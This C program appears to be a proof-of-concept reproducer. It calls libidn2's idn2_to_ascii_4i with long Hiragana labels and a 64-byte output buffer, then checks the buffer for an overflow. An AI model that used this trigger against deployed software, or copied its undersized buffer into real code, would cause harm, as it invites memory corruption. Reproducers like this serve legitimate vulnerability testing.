#include <idn2.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main() {
    uint32_t input[200];
    int len = 0;

    // Add many non-ASCII characters that will produce a long punycode output
    for (int i = 0; i < 30; i++) {
        input[len++] = 0x3042;  // HIRAGANA LETTER A
    }
    // Add a dot to create a second label
    input[len++] = 0x002E;  // '.'
    // Add another long non-ASCII label
    for (int i = 0; i < 30; i++) {
        input[len++] = 0x3042;  // HIRAGANA LETTER A
    }

    char output[64];
    memset(output, 'A', sizeof(output));
    output[63] = 0;

    printf("Calling idn2_to_ascii_4i with %d input code points\n", len);
    printf("Output buffer at %p\n", output);
    int rc = idn2_to_ascii_4i(input, len, output, 0);
    printf("rc = %d\n", rc);
    printf("output = %s\n", output);
    printf("output length = %zu\n", strlen(output));

    // Check for buffer overflow
    for (int i = 0; i < 64; i++) {
        if (output[i] == 0) {
            printf("Null at position %d\n", i);
            break;
        }
    }

    return 0;
}
EOF
